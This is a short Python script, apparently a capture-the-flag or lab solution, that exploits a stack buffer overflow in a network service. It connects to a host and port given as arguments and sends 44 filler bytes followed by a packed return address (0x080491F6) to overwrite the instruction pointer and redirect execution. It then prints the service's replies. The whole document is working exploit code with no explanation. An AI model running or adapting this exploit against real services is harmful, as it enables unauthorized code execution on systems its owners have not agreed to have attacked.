#!/usr/bin/env python

import socket
import argparse
import struct

parser = argparse.ArgumentParser()
parser.add_argument("host", type=str, help="The hostname or IP address to connect to")
parser.add_argument("port", type=int, help="The port for the service to connect to")

args = parser.parse_args()

offset = 44
eip = struct.pack("<I", 0x080491F6)

payload = b"".join([
    b"A"*44,
    eip,
])

payload += b"\n"

with socket.socket() as connection:
    connection.connect((args.host, args.port))
    connection.recv(4096).decode("utf-8")
    connection.send(payload)
    print(connection.recv(4096).decode("utf-8"))
    print(connection.recv(4096).decode("utf-8"))
